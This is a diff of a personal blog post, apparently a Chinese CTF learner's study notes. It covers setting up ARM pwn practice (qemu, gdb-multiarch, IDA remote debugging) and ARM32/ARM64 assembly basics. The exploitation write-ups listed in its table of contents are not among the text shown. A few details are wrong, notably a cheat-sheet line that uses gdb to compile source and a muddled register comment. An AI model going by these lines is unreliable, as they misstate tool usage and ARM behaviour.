@@ -21,28 +21,37 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"default"},"fold":{"enable":false,"height":300},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":{"valine":{"order":-1}}},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="arm汇编">
+    <meta name="description" content="arm_pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="arm汇编">
+<meta property="og:title" content="arm基础+pwn">
 <meta property="og:url" content="http://example.com/2025/07/08/arm%E6%B1%87%E7%BC%96/index.html">
 <meta property="og:site_name" content="le0n-blog">
-<meta property="og:description" content="arm汇编">
+<meta property="og:description" content="arm_pwn">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/07/08/images/image-20250714112054770.png">
+<meta property="og:image" content="http://example.com/2025/07/08/images/image-20250714201432283.png">
+<meta property="og:image" content="http://example.com/images/f1078db8f11b422accaaee75a12afda8.png">
+<meta property="og:image" content="http://example.com/images/image-20250714210630341.png">
+<meta property="og:image" content="http://example.com/2025/07/08/images/image-20250715164602158.png">
+<meta property="og:image" content="http://example.com/2025/07/08/images/image-20250715164716861.png">
+<meta property="og:image" content="http://example.com/images/image-20250716181619125.png">
+<meta property="og:image" content="http://example.com/images/image-20250717155011131.png">
 <meta property="article:published_time" content="2025-07-08T10:34:13.285Z">
-<meta property="article:modified_time" content="2025-07-08T10:34:51.909Z">
+<meta property="article:modified_time" content="2025-07-18T10:07:21.849Z">
 <meta property="article:author" content="leon">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="arm">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/07/08/images/image-20250714112054770.png">
 
 
 <link rel="canonical" href="http://example.com/2025/07/08/arm%E6%B1%87%E7%BC%96/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/07/08/arm%E6%B1%87%E7%BC%96/","path":"2025/07/08/arm汇编/","title":"arm汇编"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/07/08/arm%E6%B1%87%E7%BC%96/","path":"2025/07/08/arm汇编/","title":"arm基础+pwn"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>arm汇编 | le0n-blog</title>
+<title>arm基础+pwn | le0n-blog</title>
   
 
 
@@ -101,7 +110,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -114,6 +123,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%BF%90%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">arm_pwn环境搭建运行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95"><span class="nav-number">1.1.</span> <span class="nav-text">gdb调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="nav-number">1.2.</span> <span class="nav-text">ida远程调试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#arm%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">arm基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#arm32"><span class="nav-number">2.1.</span> <span class="nav-text">arm32</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A2%8E%E7%9F%A5%E8%AF%86"><span class="nav-number">2.1.1.</span> <span class="nav-text">碎知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thumb%E6%A8%A1%E5%BC%8F"><span class="nav-number">2.1.2.</span> <span class="nav-text">Thumb模式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#arm64"><span class="nav-number">2.2.</span> <span class="nav-text">arm64</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0"><span class="nav-number">3.1.</span> <span class="nav-text">例题学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#root-me-stack-buffer-overflow-basic"><span class="nav-number">3.1.1.</span> <span class="nav-text">root_me_stack_buffer_overflow_basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#task"><span class="nav-number">3.1.2.</span> <span class="nav-text">task</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwnme"><span class="nav-number">3.1.3.</span> <span class="nav-text">pwnme</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctfshow"><span class="nav-number">3.2.</span> <span class="nav-text">ctfshow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn346"><span class="nav-number">3.2.1.</span> <span class="nav-text">pwn346</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn347"><span class="nav-number">3.2.2.</span> <span class="nav-text">pwn347</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn349"><span class="nav-number">3.2.3.</span> <span class="nav-text">pwn349</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -128,18 +138,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -187,12 +197,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="arm汇编 | le0n-blog">
-      <meta itemprop="description" content="arm汇编">
+      <meta itemprop="name" content="arm基础+pwn | le0n-blog">
+      <meta itemprop="description" content="arm_pwn">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          arm汇编
+          arm基础+pwn
         </h1>
 
         <div class="post-meta-container">
@@ -202,9 +212,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2025-07-08 18:34:13 / Modified: 18:34:51" itemprop="dateCreated datePublished" datetime="2025-07-08T18:34:13+08:00">2025-07-08</time>
+      <time title="Created: 2025-07-08 18:34:13" itemprop="dateCreated datePublished" datetime="2025-07-08T18:34:13+08:00">2025-07-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-07-18 18:07:21" itemprop="dateModified" datetime="2025-07-18T18:07:21+08:00">2025-07-18</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -230,25 +246,366 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>0</span>
+      <span>18k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
+      <span>17 mins.</span>
     </span>
 </div>
 
-            <div class="post-description">arm汇编</div>
+            <div class="post-description">arm_pwn</div>
         </div>
       </header>
 
     
     
     
-    <div class="post-body" itemprop="articleBody">
+    <div class="post-body" itemprop="articleBody"><h1 id="arm-pwn环境搭建运行"><a href="#arm-pwn环境搭建运行" class="headerlink" title="arm_pwn环境搭建运行"></a>arm_pwn环境搭建运行</h1><p><a target="_blank" rel="noopener" href="https://nuoye-blog.github.io/2020/07/24/22a5ca48/">环境搭建参考链接</a></p>
+<p>搭建好后找一个arm_pwn文件</p>
+<p><strong>checksec可正常检测pwn文件关于arm架构</strong></p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwnme                                                                           </span><br><span class="line">[*] <span class="string">&#x27;/arm_pwn/pwnme&#x27;</span></span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+
+<p><strong>qemu（ai解释）：</strong></p>
+<ol>
+<li><strong>为了能运行 (Execution):</strong> 没有 QEMU 这个“翻译官”，你的 x86 电脑根本无法执行 ARM 指令，程序连第一行代码都跑不起来。</li>
+<li><strong>为了方便 (Convenience):</strong> 你不需要为了 pwn 一个 ARM 程序就去买一台树莓派或者其他 ARM 开发板。你可以在你最熟悉的 x86&#x2F;Linux 环境下完成所有的分析和利用开发工作。</li>
+<li><strong>为了调试 (Debugging):</strong> 正如上一个回答提到的，QEMU 的 -g 参数可以把它变成一个 GDB 服务器，让你能够使用 gdb-multiarch 这种强大的工具去单步调试、下断点、检查内存，这对于漏洞利用来说是必不可少的。</li>
+</ol>
+<p><strong>QEMU 为异构架构的程序（比如ARM）在本地计算机（x86）上创造了一个可以运行、可以调试的完整虚拟环境。</strong></p>
+<p>配置好环境后我们知道arm架构的程序不能直接在本地计算机运行需要借助qemu这个虚拟环境来进行远程调试，下面将有gdb和ida的远程调试</p>
+<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>先运行命令，将程序运行在1234端口</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L ./ -g 1234 ./pwn</span><br></pre></td></tr></table></figure>
+
+<p>gdb命令：</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br></pre></td></tr></table></figure>
+
+<p>运行起来后先设置架构</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">arch</span> arm</span><br></pre></td></tr></table></figure>
+
+<p>然后监听1234端口即可进行调试</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最后的调试就和gdb命令一样啦</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> //使用gdb编译 -g -o</span><br><span class="line">$ gdb -g program.c(源码) -o program(可执行文件)</span><br><span class="line">​</span><br><span class="line">//启动gdb调试</span><br><span class="line">$ gdb program(可执行文件名)</span><br><span class="line">​</span><br><span class="line">//运行</span><br><span class="line">(gdb)start   //程序运行，并停在第一行</span><br><span class="line">(gdb)r       //run，程序运行，遇到断点才停</span><br><span class="line">(gdb)c       //continue，继续运行</span><br><span class="line">(gdb)n 或者 s   //按照C语言行级别的单步调试，n(跟踪，不进入函数内部)，s(步入，进入函数内部)</span><br><span class="line">(gdb)ni 或者si  //按照汇编代码行级别的单步调试</span><br><span class="line">​</span><br><span class="line">//断点</span><br><span class="line">(gdb)b 函数名  //下断点 ，其他用法：b *地址；b 行号；b *函数名，断点设置在函数的开头</span><br><span class="line">(gdb)i b     //查看断点， info break</span><br><span class="line">(gdb)d 断点编号     //删除断点</span><br><span class="line">(gdb)clear 函数名/行号   //删除加在某个函数或某行的断点</span><br><span class="line">(gdb)commands 断点编号   //断点后添加代码，达到自动化调试</span><br><span class="line">     &gt; 代码</span><br><span class="line">     &gt; end</span><br><span class="line">(gdb)disable 断点编号   //设置断点无效</span><br><span class="line">(gdb)enable 断点编号    //设置断点生效</span><br><span class="line">(gdb)b 行号 if 条件    //设置条件断点 </span><br><span class="line">​</span><br><span class="line">//显示</span><br><span class="line">(gdb)disas 函数名   //disassemble，查看函数的汇编指令</span><br><span class="line">(gdb)info line   //查看当前位置的源代码在内存中地址，info 后面还可以加其它的，用于查看相关信息</span><br><span class="line">(gdb)x/从内存地址开始要显示内存单元的个数  内存地址   //显示内存</span><br><span class="line">​</span><br><span class="line">Ctrl+X+A   //进入或退出图形化调试窗口，或者在运行时使用gdb -tui 可执行文件名</span><br><span class="line">(gdb)layout regs  //实时显示寄存器值和源码的变化，layout后面还可以+ src(仅显示源代码窗口)/asm(仅显示汇编代码窗口)/split(显示源代码和汇编代码窗口)，layout next/prev(切换窗口)</span><br><span class="line">(gdb)win asm/src/split/regs +/- 行数  //调整窗口大小</span><br><span class="line">(gdb)tui reg float/system/general  //显示浮点寄存器/系统寄存器/通用寄存器</span><br><span class="line">​</span><br><span class="line">//查看当前代码</span><br><span class="line">(gdb)l    //list简写，从默认位置显示，显示当前行后面的源程序</span><br><span class="line">(gdb)l 行号   //从指定行显示</span><br><span class="line">(gdb)l 函数名   //从指定函数显示</span><br><span class="line">(gdb)show list  //显示list展示的行数</span><br><span class="line">(gdb)set list 行数  //设置list展示的行数</span><br><span class="line">​</span><br><span class="line">//打印，变量</span><br><span class="line">(gdb)p 变量名    //print，打印变量值</span><br><span class="line">(gdb)ptype 变量名  //打印变量类型</span><br><span class="line">(gdb)display 变量名   //跟踪查看一个变量，每次都停下来显示它的值</span><br><span class="line">(gdb)i display    //查看设置的自动变量操作</span><br><span class="line">(gdb)undisplay 自动变量编号   //取消对先前设置的那些变量的跟踪</span><br><span class="line">(gdb)set var 变量名 = 变量值  //设置变量</span><br><span class="line">(gdb)finish   //跳出函数体</span><br><span class="line">(gdb)until    //跳出循环</span><br></pre></td></tr></table></figure>
+
+<h2 id="ida远程调试"><a href="#ida远程调试" class="headerlink" title="ida远程调试"></a>ida远程调试</h2><p>在linux系统中先运行起来<code>qemu-arm -L ./ -g 1234 ./pwn</code></p>
+<p>设置debugger为Remote GDB debugger</p>
+<img data-src="../images/image-20250714112054770.png" alt="image-20250714112054770" style="zoom: 50%;" />
+
+<p>然后按照以下流程：debugger —-&gt; process options —-&gt; 填写 hostname和post —-&gt; OK —-&gt;debugger的attach to process</p>
+<p>即可在ida中调试对应程序</p>
+<p>ida调试基础：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">F9:运行（在调试器中启动一个新的进程或继续调试另一个进程）</span><br><span class="line">F2：设置断点</span><br><span class="line">Ctrl+F2：终止调试进程</span><br><span class="line">F4：执行到光标处</span><br><span class="line">F7:单步步入（进入函数内部）</span><br><span class="line">Ctrl+F7：执行到从当前函数返回时</span><br><span class="line">F8：单步跟踪（不进入函数内部）</span><br><span class="line">F5：查看伪代码</span><br><span class="line">Tab：伪代码和汇编指令之间的切换</span><br><span class="line">Ctrl+alt+S：打开堆栈记录窗口</span><br><span class="line">Ctrl+alt+B：打开断点窗口</span><br><span class="line">​</span><br><span class="line">Esc：在反汇编窗口中，返回到上一步操作的位置</span><br><span class="line">空格键：在反汇编窗口中，切换图形视图与列表视图</span><br><span class="line">​</span><br><span class="line">shift+F12:查看字符串</span><br><span class="line">Alt+T：搜索字符串</span><br><span class="line">Alt+B：搜索二进制序列</span><br><span class="line">Ctrl+B：搜索下一个字符串/二进制序列</span><br><span class="line">​</span><br><span class="line">Alt+M:给某个地址设置标签</span><br><span class="line">Ctrl+M：跳转到标签，通常配合Alt+M使用</span><br><span class="line">Ctrl+W：保存IDA数据库</span><br><span class="line">Ctrl+Shift+W：拍摄IDA快照</span><br><span class="line">​</span><br><span class="line">【；】：重复注释，会在所有引用到的地方都出现注释</span><br><span class="line">【：】：普通注释</span><br><span class="line">P：将数据转换为函数</span><br><span class="line">C: 将数据转化为代码，无法识别栈帧</span><br><span class="line">A：转换为字符串</span><br><span class="line">D：转换为数据</span><br><span class="line">U：转换为未定义数据</span><br><span class="line">X：查看交叉引用</span><br><span class="line">Y：修改类型</span><br><span class="line">N：修改名称</span><br><span class="line">G：转到指定地址</span><br><span class="line">H：十进制和十六进制转换</span><br></pre></td></tr></table></figure>
+
+<p><strong>一些小技巧</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">架构</th>
+<th align="left">关键识别词</th>
+<th align="left">工具链包名 (Debian&#x2F;Ubuntu)</th>
+<th align="left">反汇编命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>64位 ARM</strong></td>
+<td align="left"><code>aarch64</code></td>
+<td align="left"><code>binutils-aarch64-linux-gnu</code></td>
+<td align="left"><code>aarch64-linux-gnu-objdump</code></td>
+</tr>
+<tr>
+<td align="left"><strong>32位 ARM</strong></td>
+<td align="left"><code>ARM</code>, <code>EABI5</code></td>
+<td align="left"><code>binutils-arm-linux-gnueabihf</code></td>
+<td align="left"><code>arm-linux-gnueabihf-objdump</code></td>
+</tr>
+</tbody></table>
+<p>这两个工具包包含了对应的objdump与Linux中的objdump一样</p>
+<p>常用命令：</p>
+<ul>
+<li><code>aarch64-linux-gnu-objdump -D ./test | less</code>  分页反汇编所有段 </li>
+<li><code>objdump -f ./test </code> 显示文件头信息</li>
+<li><code>readelf -h ./test</code>  显示文件头信息</li>
+<li>_start即相当于_libc_start_main</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400490 &lt;_start&gt;:</span><br><span class="line">  400490:   mov     x29, #0x0         // 清空帧指针</span><br><span class="line">  400494:   mov     x30, #0x0         // 清空链接寄存器</span><br><span class="line">  400498:   ldr     x1, [sp]          // 从栈顶加载 argc 到 x0 (实际上是x1)</span><br><span class="line">  40049c:   add     x1, sp, #8        // 计算 argv 的地址给 x1</span><br><span class="line">  ...</span><br><span class="line">  4004b0:   bl      0x4006c0 &lt;main&gt;   // 调用 main 函数</span><br><span class="line">  4004b4:   mov     w0, w19           // main 返回后，将其返回值放入 w0</span><br><span class="line">  4004b8:   bl      0x4005e0 &lt;exit&gt;   // 调用 exit</span><br></pre></td></tr></table></figure>
+<p><em>(注意：不同编译器和库版本，这里的实现细节会略有不同，但流程是一致的)</em></p>
+<table>
+<thead>
+<tr>
+<th align="left">概念</th>
+<th align="left">含义</th>
+<th align="left">如何找到&#x2F;定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>入口点 (Entry Point)</strong></td>
+<td align="left">OS 加载后执行的<strong>第一条指令</strong>的地址。</td>
+<td align="left">• 用 <code>readelf -h</code> 查看<br>• 默认标签是 <code>_start</code></td>
+</tr>
+<tr>
+<td align="left"><strong><code>main</code> 函数</strong></td>
+<td align="left">C&#x2F;C++ 语言的<strong>逻辑起点</strong>，被 <code>_start</code> 调用。</td>
+<td align="left">• 一个普通的函数，我们写的代码从这里开始。</td>
+</tr>
+</tbody></table>
+<h1 id="arm基础知识"><a href="#arm基础知识" class="headerlink" title="arm基础知识"></a>arm基础知识</h1><p><a target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/128270882?spm=1001.2014.3001.5502">一篇不错的文章</a></p>
+<h2 id="arm32"><a href="#arm32" class="headerlink" title="arm32"></a>arm32</h2><h3 id="碎知识"><a href="#碎知识" class="headerlink" title="碎知识"></a>碎知识</h3><p>来自《ARM汇编与逆向工程》的摘要</p>
+<p>arm的传参方式为使用r0~r3寄存器传递前4个参数，多余的参数使用栈来传递</p>
+<p>STMFD指令可以一次性将多个寄存器按逆序压入栈里</p>
+<p>其中主要到STMFD结尾的D，可以理解为decrease，递减。那么同理STMFA指令就是按正序将寄存器压入栈里</p>
+<p>与STMFD对应的LDMFD，作用类似于pop，可以按顺序将数据从栈里弹出到寄存器里。</p>
+<p>arm里没有ret指令，程序是通过将栈里的地址弹到pc寄存器，从而实现函数返回。</p>
+<p>arm使用r0作为函数的返回值寄存器</p>
+<p>其中str指令，可以理解为STORE REGISTER，即将寄存器的值保存到内存中。与STR指令对应的LDR，即从内存数据加载到寄存器。</p>
+<p>arm中的mov指令，只能是寄存器与寄存器之间或寄存器与立即数之间的操作，而不能对内存进行mov操作</p>
+<p>arm中的B指令，时无条件跳转指令，类似于x86下的jmp</p>
+<p>而BL指令是带返回的跳转，类似于x86下的call，会将返回地址压栈</p>
+<p>表4.4 AArch32 通用寄存器别名</p>
+<table>
+<thead>
+<tr>
+<th>寄存器编号</th>
+<th>别名</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>R11</td>
+<td>FP</td>
+<td>栈帧指针</td>
+</tr>
+<tr>
+<td>R12</td>
+<td>IP</td>
+<td>子程序内部调用寄存器</td>
+</tr>
+<tr>
+<td>R13</td>
+<td>SP</td>
+<td>栈指针</td>
+</tr>
+<tr>
+<td>R14</td>
+<td>LR</td>
+<td>链接寄存器</td>
+</tr>
+<tr>
+<td>R15</td>
+<td>PC</td>
+<td>程序计数器</td>
+</tr>
+</tbody></table>
+<p>表5.1 移位操作语法符号</p>
+<table>
+<thead>
+<tr>
+<th>A32&#x2F;T32</th>
+<th>A64 (32 位)</th>
+<th>A64 (64 位)</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Rd</td>
+<td>Wd</td>
+<td>Xd</td>
+<td>目标寄存器</td>
+</tr>
+<tr>
+<td>Rn</td>
+<td>Wn</td>
+<td>Xn</td>
+<td>第一源寄存器</td>
+</tr>
+<tr>
+<td>Rm</td>
+<td>Wm</td>
+<td>Xm</td>
+<td>第二源寄存器</td>
+</tr>
+<tr>
+<td>Rs</td>
+<td>Ws</td>
+<td>Xs</td>
+<td>保存移位量的源寄存器</td>
+</tr>
+<tr>
+<td>#n</td>
+<td>#n</td>
+<td>#n</td>
+<td>移位量（立即数）</td>
+</tr>
+<tr>
+<td>{Rd,}</td>
+<td>-</td>
+<td>-</td>
+<td>可选寄存器</td>
+</tr>
+</tbody></table>
+<p>LDR和STR是一对相反的指令，LDR R1,[R0]将R0处的东西加载到R1,STR R1,[R0]将R1的东西加载到R0指向处</p>
+<h3 id="Thumb模式"><a href="#Thumb模式" class="headerlink" title="Thumb模式"></a>Thumb模式</h3><p>ARM有两种主要的状态，ARM和Thumb模式，两种状态在所有的权限下都可以运行。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/beyond702/article/details/50899196">参考链接</a></p>
+<p>Thumb模式是16位模式，Thumb模式是16位模式，在该模式下，32位指令将为无效指令。Thumb指令为16位。Thumb模式的存在，使得代码更紧凑，有时单的语句，thumb指令2字节完成，而arm指令4字节完成，由此可以节省空间。</p>
+<p>Arm与thumb模式的切换，主要是改变CPSR状态寄存器里的T标志位，如图，当T标志位为1时，cpu将处于thumb工作模式，反之，处于arm模式。<br><img data-src="../images/image-20250714201432283.png" alt="image-20250714201432283" style="zoom:67%;" /></p>
+<p>即：</p>
+<p><img data-src="/../images/f1078db8f11b422accaaee75a12afda8.png" alt="img"></p>
+<p>改变CPSR状态寄存器里的T标志位，使用BX或者LDR PC等指令，都可以完成。假设addr是一个对齐后的地址（即addr末尾为4或者0），则BX addr+1就可以切换到thumb模式，而BX addr，就可以切换到arm模式。都是带状态转移的指令。</p>
+<blockquote>
+<p>反汇编分析时，识别thumb指令与arm指令</p>
+<p>当看到code 16声明时，说明对面的代码都是thumb指令，只有再次遇到code32位时，后面的代码才是arm指令。</p>
+<p>code32是arm指令;code16是thumb指令</p>
+<p>code32的指令与code16处的指令互相调用就需要利用BX或者更改PC来跳转，跳转时地址最后1bit用于状态表示</p>
+</blockquote>
+<h2 id="arm64"><a href="#arm64" class="headerlink" title="arm64"></a>arm64</h2><p>arm64里，64位寄存器用X表示，比如X0、X1、X2，32位寄存器用W表示，比如W0、W1、W2。在ARM64下，没有了thumb指令。</p>
+<p>ARM64的传参为X0~X7传递前8给参数，剩余的用栈传递。</p>
+<p>返回值仍是X0寄存器</p>
+<p>程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h,<span class="type">int</span> i,<span class="type">int</span> j,<span class="type">int</span> k,<span class="type">int</span> l)</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>,a,b,c,d);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        fun(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>arm的反汇编</p>
